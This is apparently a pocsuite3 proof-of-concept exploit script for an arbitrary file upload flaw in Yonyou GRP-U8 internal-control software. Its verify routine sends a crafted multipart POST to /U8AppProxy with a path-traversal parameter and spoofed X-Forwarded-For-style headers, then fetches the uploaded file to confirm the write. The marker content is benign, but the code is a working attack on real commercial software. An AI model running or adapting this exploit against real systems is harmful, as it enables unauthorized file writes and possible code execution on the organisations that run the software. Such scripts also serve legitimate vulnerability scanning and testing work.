from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import random,time,base64,re

class TestPOC(POCBase):
    vulID = '12341'  # ssvid
    version = '1.0'
    name = '用友GRP-U8行政事业内控管理软件任意文件上传漏洞'
    appName = '用友GRP-U8行政事业内控管理软件任意文件上传漏洞'
    appVersion = 'GRP-u8'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''用友 GRP-u8 任意文件上传漏洞。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):              #验证模式
        result = {}
        path = "/U8AppProxy?gnid=myinfo&id=saveheader&zydm=../../hiworrd"
        vulurl = self.url+path
        vulurl1=self.url+"/hiworrd.txt"
        she='''hiword!!!'''
        file={"file":('hiword.txt',she)}
        headers={"X-Forwarded-For": "127.0.0.1",
                 "X-Originating" : "127.0.0.1",
                 "X-Remote-IP": "127.0.0.1",
                 "X-Remote-Addr": "127.0.0.1",
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0"
                 }
        try:
            resp = requests.post(url=vulurl,verify = False, allow_redirects = False, timeout=4,headers=headers,files=file)
            resp1= requests.get(url=vulurl1,verify = False, allow_redirects = False, timeout=4,headers=headers)
            if 'hiword!!!' in resp1.text and resp1.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = vulurl1
            return self.parse_output(result)
        except:
            pass
    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(TestPOC)
